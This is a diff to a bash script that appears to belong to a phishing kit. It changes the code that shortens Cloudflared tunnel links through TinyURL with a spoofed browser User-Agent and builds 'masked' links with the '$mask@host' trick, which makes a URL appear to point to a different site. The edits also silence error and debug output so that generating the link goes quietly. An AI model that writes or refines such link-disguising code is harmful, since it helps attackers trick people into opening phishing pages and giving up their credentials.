@@ -506,16 +506,16 @@ custom_mask() {
 ## URL Shortner
 shorten() {
 	# TinyURL returns the shortened URL directly as plain text
-	# Remove --fail flag as it can cause issues, and capture both stdout and stderr
-	short=$(curl --silent --insecure --retry-connrefused --retry 2 --retry-delay 2 "$1" 2>&1)
+	# Add User-Agent header as TinyURL may block requests without it
+	short=$(curl --silent --insecure --retry-connrefused --retry 2 --retry-delay 2 \
+		-A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
+		"$1" 2>&1)
 	
 	# Check if the response is a valid TinyURL
 	if [[ ! -z "$short" && "$short" == http*"tinyurl.com"* && ! "$short" == *"Error"* && ! "$short" == *"error"* ]]; then
 		processed_url="$short"
 		return 0
 	else
-		# Debug: show what we got if it failed
-		echo -e "\n${RED}[DEBUG]${WHITE} TinyURL response: $short"
 		return 1
 	fi
 }
@@ -530,30 +530,27 @@ custom_url() {
 		# Primary URL (direct cloudflared/loclx link)
 		url="https://$url"
 		
-		# Try to shorten with TinyURL
-		echo -ne "\n${CYAN}[${WHITE}*${CYAN}]${CYAN} Attempting to shorten URL with TinyURL..."
+		# Try to shorten with TinyURL (silently, as it's optional)
 		if shorten "$tinyurl$url"; then
-			# Successfully shortened
-			echo -e " ${GREEN}Success!${WHITE}"
+			# Successfully shortened - show success message
+			echo -e "${CYAN}[${WHITE}✓${CYAN}]${GREEN} TinyURL shortened successfully${WHITE}"
 			masked_url="$mask@${processed_url#http*//}"
 		else
-			# TinyURL failed, no shortened URL available
-			echo -e " ${RED}Failed${WHITE}"
-			echo -e "${ORANGE}[${WHITE}!${ORANGE}]${ORANGE} TinyURL shortening unavailable (may be blocked or rate-limited)"
-			processed_url="Shortener unavailable"
+			# TinyURL failed - just skip it silently since direct link works
+			processed_url=""
 			masked_url=""
 		fi
 	else
 		# Invalid URL pattern
 		url="Unable to generate links. Try after turning on hotspot"
-		processed_url="Unable to Short URL"
+		processed_url=""
 		masked_url=""
 	fi
 
 	# Display URLs
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 (Direct Cloudflared): ${GREEN}$url"
 	
-	if [[ $processed_url != *"Unable"* && $processed_url != *"unavailable"* ]]; then
+	if [[ ! -z "$processed_url" ]]; then
 		echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 (TinyURL): ${ORANGE}$processed_url"
 	fi
 	
